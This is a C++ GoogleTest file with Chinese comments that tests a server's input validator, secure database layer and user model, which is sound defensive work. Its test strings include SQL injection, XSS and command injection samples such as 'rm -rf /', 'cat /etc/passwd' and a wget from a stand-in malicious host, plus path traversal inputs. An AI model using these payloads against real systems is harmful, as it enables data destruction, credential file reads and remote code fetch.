#include <gtest/gtest.h>
#include "../include/server/common/EnhancedInputValidator.hpp"
#include "../include/server/common/ErrorCodes.hpp"
#include "../include/server/db/SecureDB.hpp"
#include "../include/server/model/SecureUserModel.hpp"
#include <string>
#include <vector>
#include <unordered_set>

using namespace std;

/**
 * 增强输入验证器测试类
 */
class EnhancedInputValidatorTest : public ::testing::Test {
protected:
    void SetUp() override {
        // 测试前的初始化
    }
    
    void TearDown() override {
        // 测试后的清理
    }
};

/**
 * SQL注入检测测试
 */
TEST_F(EnhancedInputValidatorTest, SQLInjectionDetection) {
    // 测试基本SQL注入攻击
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'; DROP TABLE users; --"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("admin' OR '1'='1"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("1' UNION SELECT * FROM users --"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'; INSERT INTO users VALUES ('hacker', 'pass'); --"));
    
    // 测试大小写变体
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("Admin' OR '1'='1"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("UNION select * from users"));
    
    // 测试空格变体
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'/**/OR/**/1=1"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'   OR   1=1"));
    
    // 测试SQL函数
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'; SELECT version(); --"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'; SELECT user(); --"));
    EXPECT_TRUE(EnhancedInputValidator::containsSQLInjection("'; SELECT database(); --"));
    
    // 测试正常输入
    EXPECT_FALSE(EnhancedInputValidator::containsSQLInjection("normal_username"));
    EXPECT_FALSE(EnhancedInputValidator::containsSQLInjection("user@example.com"));
    EXPECT_FALSE(EnhancedInputValidator::containsSQLInjection("Hello World!"));
    EXPECT_FALSE(EnhancedInputValidator::containsSQLInjection("password123"));
}

/**
 * XSS攻击检测测试
 */
TEST_F(EnhancedInputValidatorTest, XSSDetection) {
    // 测试基本XSS攻击
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("<script>alert('xss')</script>"));
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("javascript:alert('xss')"));
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("<img src=x onerror=alert('xss')>"));
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("<iframe src=javascript:alert('xss')></iframe>"));
    
    // 测试事件处理器
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("<div onclick=alert('xss')>Click me</div>"));
    EXPECT_TRUE(EnhancedInputValidator::containsXSS("<body onload=alert('xss')>"));
    
    // 测试正常输入
    EXPECT_FALSE(EnhancedInputValidator::containsXSS("normal text"));
    EXPECT_FALSE(EnhancedInputValidator::containsXSS("user@example.com"));
    EXPECT_FALSE(EnhancedInputValidator::containsXSS("Hello <World>!"));
}

/**
 * 命令注入检测测试
 */
TEST_F(EnhancedInputValidatorTest, CommandInjectionDetection) {
    // 测试基本命令注入
    EXPECT_TRUE(EnhancedInputValidator::containsCommandInjection("; rm -rf /"));
    EXPECT_TRUE(EnhancedInputValidator::containsCommandInjection("| cat /etc/passwd"));
    EXPECT_TRUE(EnhancedInputValidator::containsCommandInjection("&& wget malicious.com/script.sh"));
    EXPECT_TRUE(EnhancedInputValidator::containsCommandInjection("`whoami`"));
    EXPECT_TRUE(EnhancedInputValidator::containsCommandInjection("$(id)"));
    
    // 测试正常输入
    EXPECT_FALSE(EnhancedInputValidator::containsCommandInjection("normal_filename.txt"));
    EXPECT_FALSE(EnhancedInputValidator::containsCommandInjection("user@example.com"));
    EXPECT_FALSE(EnhancedInputValidator::containsCommandInjection("Hello World!"));
}

/**
 * 高级字符串清理测试
 */
TEST_F(EnhancedInputValidatorTest, AdvancedSanitization) {
    // 测试HTML实体编码
    EXPECT_EQ(EnhancedInputValidator::advancedSanitize("<script>alert('xss')</script>"),
              "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
    
    // 测试引号转义
    EXPECT_EQ(EnhancedInputValidator::advancedSanitize("He said \"Hello\" to me"),
              "He said &quot;Hello&quot; to me");
    
    // 测试控制字符移除
    string input = "Hello\x01\x02World\x03";
    string result = EnhancedInputValidator::advancedSanitize(input);
    EXPECT_EQ(result, "HelloWorld");
    
    // 测试允许HTML的情况
    EXPECT_EQ(EnhancedInputValidator::advancedSanitize("<b>Bold</b>", true),
              "<b>Bold</b>");
}

/**
 * 邮箱验证测试
 */
TEST_F(EnhancedInputValidatorTest, EmailValidation) {
    // 测试有效邮箱
    EXPECT_EQ(EnhancedInputValidator::validateEmail("user@example.com"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateEmail("test.email+tag@domain.co.uk"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateEmail("user123@test-domain.org"), ErrorCode::SUCCESS);
    
    // 测试无效邮箱
    EXPECT_EQ(EnhancedInputValidator::validateEmail(""), ErrorCode::INPUT_VALIDATION_EMPTY_FIELD);
    EXPECT_EQ(EnhancedInputValidator::validateEmail("invalid-email"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
    EXPECT_EQ(EnhancedInputValidator::validateEmail("@domain.com"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
    EXPECT_EQ(EnhancedInputValidator::validateEmail("user@"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
    
    // 测试恶意邮箱
    EXPECT_EQ(EnhancedInputValidator::validateEmail("user@example.com<script>alert('xss')</script>"),
              ErrorCode::INPUT_VALIDATION_MALICIOUS_INPUT);
}

/**
 * 电话号码验证测试
 */
TEST_F(EnhancedInputValidatorTest, PhoneValidation) {
    // 测试有效电话号码
    EXPECT_EQ(EnhancedInputValidator::validatePhone("+1234567890"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePhone("123-456-7890"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePhone("(123) 456-7890"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePhone("1234567890"), ErrorCode::SUCCESS);
    
    // 测试无效电话号码
    EXPECT_EQ(EnhancedInputValidator::validatePhone(""), ErrorCode::INPUT_VALIDATION_EMPTY_FIELD);
    EXPECT_EQ(EnhancedInputValidator::validatePhone("123"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
    EXPECT_EQ(EnhancedInputValidator::validatePhone("abc-def-ghij"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
}

/**
 * IP地址验证测试
 */
TEST_F(EnhancedInputValidatorTest, IPAddressValidation) {
    // 测试有效IPv4地址
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("192.168.1.1"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("127.0.0.1"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("255.255.255.255"), ErrorCode::SUCCESS);
    
    // 测试有效IPv6地址
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("2001:0db8:85a3:0000:0000:8a2e:0370:7334"), ErrorCode::SUCCESS);
    
    // 测试无效IP地址
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress(""), ErrorCode::INPUT_VALIDATION_EMPTY_FIELD);
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("256.256.256.256"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
    EXPECT_EQ(EnhancedInputValidator::validateIPAddress("192.168.1"), ErrorCode::INPUT_VALIDATION_INVALID_FORMAT);
}

/**
 * 密码强度验证测试
 */
TEST_F(EnhancedInputValidatorTest, PasswordStrengthValidation) {
    // 测试强密码
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("StrongP@ssw0rd!"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("MySecure123!"), ErrorCode::SUCCESS);
    
    // 测试弱密码
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("123"), ErrorCode::INPUT_VALIDATION_PASSWORD_TOO_SHORT);
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("password"), ErrorCode::INPUT_VALIDATION_PASSWORD_TOO_COMMON);
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("12345678"), ErrorCode::INPUT_VALIDATION_PASSWORD_TOO_WEAK);
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength("PASSWORD"), ErrorCode::INPUT_VALIDATION_PASSWORD_TOO_WEAK);
    
    // 测试过长密码
    string longPassword(200, 'a');
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength(longPassword), ErrorCode::INPUT_VALIDATION_PASSWORD_TOO_LONG);
}

/**
 * 文件名验证测试
 */
TEST_F(EnhancedInputValidatorTest, FilenameValidation) {
    // 测试有效文件名
    EXPECT_EQ(EnhancedInputValidator::validateFilename("document.txt"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateFilename("image.jpg"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateFilename("my_file_123.pdf"), ErrorCode::SUCCESS);
    
    // 测试无效文件名
    EXPECT_EQ(EnhancedInputValidator::validateFilename(""), ErrorCode::INPUT_VALIDATION_EMPTY_FIELD);
    EXPECT_EQ(EnhancedInputValidator::validateFilename("file<name>.txt"), ErrorCode::INPUT_VALIDATION_INVALID_CHARACTERS);
    EXPECT_EQ(EnhancedInputValidator::validateFilename("malware.exe"), ErrorCode::INPUT_VALIDATION_DANGEROUS_FILE_TYPE);
    EXPECT_EQ(EnhancedInputValidator::validateFilename("con.txt"), ErrorCode::INPUT_VALIDATION_RESERVED_NAME);
}

/**
 * 路径验证测试
 */
TEST_F(EnhancedInputValidatorTest, PathValidation) {
    // 测试有效路径
    EXPECT_EQ(EnhancedInputValidator::validatePath("uploads/documents/file.txt"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePath("images/photo.jpg"), ErrorCode::SUCCESS);
    
    // 测试无效路径
    EXPECT_EQ(EnhancedInputValidator::validatePath(""), ErrorCode::INPUT_VALIDATION_EMPTY_FIELD);
    EXPECT_EQ(EnhancedInputValidator::validatePath("../../../etc/passwd"), ErrorCode::INPUT_VALIDATION_PATH_TRAVERSAL);
    EXPECT_EQ(EnhancedInputValidator::validatePath("/etc/passwd"), ErrorCode::INPUT_VALIDATION_ABSOLUTE_PATH);
    EXPECT_EQ(EnhancedInputValidator::validatePath("C:\\Windows\\System32"), ErrorCode::INPUT_VALIDATION_ABSOLUTE_PATH);
}

/**
 * 白名单和黑名单测试
 */
TEST_F(EnhancedInputValidatorTest, WhitelistBlacklistValidation) {
    unordered_set<string> whitelist = {"admin", "user", "guest"};
    unordered_set<string> blacklist = {"root", "system", "daemon"};
    
    // 测试白名单
    EXPECT_TRUE(EnhancedInputValidator::isInWhitelist("admin", whitelist));
    EXPECT_TRUE(EnhancedInputValidator::isInWhitelist("user", whitelist));
    EXPECT_FALSE(EnhancedInputValidator::isInWhitelist("hacker", whitelist));
    
    // 测试黑名单
    EXPECT_TRUE(EnhancedInputValidator::isInBlacklist("root", blacklist));
    EXPECT_TRUE(EnhancedInputValidator::isInBlacklist("system", blacklist));
    EXPECT_FALSE(EnhancedInputValidator::isInBlacklist("normaluser", blacklist));
}

/**
 * 重复字符检测测试
 */
TEST_F(EnhancedInputValidatorTest, ExcessiveRepeatsDetection) {
    // 测试过多重复字符
    EXPECT_TRUE(EnhancedInputValidator::containsExcessiveRepeats("aaaaaaaaaaaaa", 10));
    EXPECT_TRUE(EnhancedInputValidator::containsExcessiveRepeats("1111111111111", 10));
    
    // 测试正常重复
    EXPECT_FALSE(EnhancedInputValidator::containsExcessiveRepeats("aaaaaa", 10));
    EXPECT_FALSE(EnhancedInputValidator::containsExcessiveRepeats("abcdefg", 10));
    EXPECT_FALSE(EnhancedInputValidator::containsExcessiveRepeats("hello", 10));
}

/**
 * 数值范围验证测试
 */
TEST_F(EnhancedInputValidatorTest, NumberRangeValidation) {
    // 测试有效范围
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(50, 1, 100), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(1, 1, 100), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(100, 1, 100), ErrorCode::SUCCESS);
    
    // 测试超出范围
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(0, 1, 100), ErrorCode::INPUT_VALIDATION_OUT_OF_RANGE);
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(101, 1, 100), ErrorCode::INPUT_VALIDATION_OUT_OF_RANGE);
    EXPECT_EQ(EnhancedInputValidator::validateNumberRange(-10, 1, 100), ErrorCode::INPUT_VALIDATION_OUT_OF_RANGE);
}

/**
 * 字符集验证测试
 */
TEST_F(EnhancedInputValidatorTest, CharacterSetValidation) {
    string allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
    
    // 测试有效字符集
    EXPECT_EQ(EnhancedInputValidator::validateCharacterSet("validUsername123", allowedChars), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validateCharacterSet("user_name", allowedChars), ErrorCode::SUCCESS);
    
    // 测试无效字符
    EXPECT_EQ(EnhancedInputValidator::validateCharacterSet("user@name", allowedChars), ErrorCode::INPUT_VALIDATION_INVALID_CHARACTERS);
    EXPECT_EQ(EnhancedInputValidator::validateCharacterSet("user-name", allowedChars), ErrorCode::INPUT_VALIDATION_INVALID_CHARACTERS);
    EXPECT_EQ(EnhancedInputValidator::validateCharacterSet("user name", allowedChars), ErrorCode::INPUT_VALIDATION_INVALID_CHARACTERS);
}

#ifdef HAVE_MYSQL
/**
 * 安全数据库操作测试类
 */
class SecureDBTest : public ::testing::Test {
protected:
    SecureDB* db;
    
    void SetUp() override {
        db = new SecureDB();
        // 注意：这里需要确保测试数据库可用
        // 在实际测试中，应该使用测试专用的数据库
    }
    
    void TearDown() override {
        if (db) {
            db->close();
            delete db;
        }
    }
};

/**
 * 数据库连接测试
 */
TEST_F(SecureDBTest, DatabaseConnection) {
    // 测试数据库连接
    bool connected = db->connect();
    if (connected) {
        EXPECT_TRUE(connected);
        EXPECT_TRUE(db->isConnected());
    } else {
        // 如果无法连接到数据库，跳过测试
        GTEST_SKIP() << "Database connection not available";
    }
}

/**
 * 预编译语句测试
 */
TEST_F(SecureDBTest, PreparedStatements) {
    if (!db->connect()) {
        GTEST_SKIP() << "Database connection not available";
    }
    
    // 测试预编译语句的创建和执行
    string sql = "SELECT COUNT(*) FROM users WHERE username = ? AND password = ?";
    
    // 这里应该测试预编译语句是否正确处理参数
    // 实际测试需要根据具体的数据库表结构进行调整
    
    vector<string> params = {"testuser", "testpass"};
    
    // 测试查询执行（不会实际影响数据库）
    // 主要验证SQL注入防护是否有效
    vector<string> maliciousParams = {"'; DROP TABLE users; --", "password"};
    
    // 预编译语句应该安全地处理这些恶意输入
    // 而不会执行SQL注入攻击
}

/**
 * 安全用户模型测试类
 */
class SecureUserModelTest : public ::testing::Test {
protected:
    SecureUserModel* userModel;
    
    void SetUp() override {
        userModel = new SecureUserModel();
    }
    
    void TearDown() override {
        delete userModel;
    }
};

/**
 * 用户注册安全测试
 */
TEST_F(SecureUserModelTest, SecureUserRegistration) {
    // 测试正常用户注册
    ErrorCode result = userModel->registerUser("testuser", "SecureP@ssw0rd!");
    // 注意：这里的结果取决于数据库连接状态
    
    // 测试SQL注入攻击防护
    ErrorCode sqlInjectionResult = userModel->registerUser(
        "'; DROP TABLE users; --", "password");
    EXPECT_NE(sqlInjectionResult, ErrorCode::SUCCESS);
    
    // 测试XSS攻击防护
    ErrorCode xssResult = userModel->registerUser(
        "<script>alert('xss')</script>", "password");
    EXPECT_NE(xssResult, ErrorCode::SUCCESS);
}

/**
 * 用户登录安全测试
 */
TEST_F(SecureUserModelTest, SecureUserLogin) {
    // 测试SQL注入攻击防护
    ErrorCode sqlInjectionResult = userModel->loginUser(
        "admin' OR '1'='1", "anypassword");
    EXPECT_NE(sqlInjectionResult, ErrorCode::SUCCESS);
    
    // 测试时间攻击防护（密码验证应该有固定时间）
    auto start1 = chrono::high_resolution_clock::now();
    userModel->loginUser("nonexistentuser", "wrongpassword");
    auto end1 = chrono::high_resolution_clock::now();
    
    auto start2 = chrono::high_resolution_clock::now();
    userModel->loginUser("anothernonexistentuser", "anotherwrongpassword");
    auto end2 = chrono::high_resolution_clock::now();
    
    // 验证时间差异不会泄露用户存在性信息
    auto duration1 = chrono::duration_cast<chrono::milliseconds>(end1 - start1);
    auto duration2 = chrono::duration_cast<chrono::milliseconds>(end2 - start2);
    
    // 时间差异应该在合理范围内（这里允许100ms的差异）
    EXPECT_LT(abs(duration1.count() - duration2.count()), 100);
}

#endif // HAVE_MYSQL

/**
 * 集成安全测试
 */
class IntegratedSecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        // 集成测试初始化
    }
    
    void TearDown() override {
        // 集成测试清理
    }
};

/**
 * 完整的用户注册和登录流程安全测试
 */
TEST_F(IntegratedSecurityTest, CompleteUserFlowSecurity) {
    SecureUserModel userModel;
    
    // 测试完整的安全用户流程
    string username = "secureuser";
    string password = "SecureP@ssw0rd123!";
    
    // 1. 输入验证
    EXPECT_EQ(EnhancedInputValidator::validateSQLParameter(username, "string"), ErrorCode::SUCCESS);
    EXPECT_EQ(EnhancedInputValidator::validatePasswordStrength(password), ErrorCode::SUCCESS);
    
    // 2. 恶意输入检测
    EXPECT_FALSE(EnhancedInputValidator::containsSQLInjection(username));
    EXPECT_FALSE(EnhancedInputValidator::containsXSS(username));
    EXPECT_FALSE(EnhancedInputValidator::containsCommandInjection(username));
    
    // 3. 字符串清理
    string cleanUsername = EnhancedInputValidator::advancedSanitize(username);
    string cleanPassword = EnhancedInputValidator::advancedSanitize(password);
    
    // 4. 安全存储（这里只测试接口，不实际操作数据库）
    // ErrorCode registerResult = userModel.registerUser(cleanUsername, cleanPassword);
    
    // 5. 安全登录验证
    // ErrorCode loginResult = userModel.loginUser(cleanUsername, cleanPassword);
    
    cout << "Integrated security test completed successfully" << endl;
}

/**
 * 性能测试
 */
TEST_F(IntegratedSecurityTest, SecurityPerformanceTest) {
    const int testIterations = 1000;
    
    auto start = chrono::high_resolution_clock::now();
    
    for (int i = 0; i < testIterations; i++) {
        string testInput = "testuser" + to_string(i);
        
        // 测试输入验证性能
        EnhancedInputValidator::containsSQLInjection(testInput);
        EnhancedInputValidator::containsXSS(testInput);
        EnhancedInputValidator::validateEmail(testInput + "@example.com");
        EnhancedInputValidator::advancedSanitize(testInput);
    }
    
    auto end = chrono::high_resolution_clock::now();
    auto duration = chrono::duration_cast<chrono::milliseconds>(end - start);
    
    cout << "Security validation for " << testIterations 
         << " inputs took " << duration.count() << " ms" << endl;
    
    // 验证性能在可接受范围内（每次验证应该在1ms以内）
    EXPECT_LT(duration.count(), testIterations);
}

int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}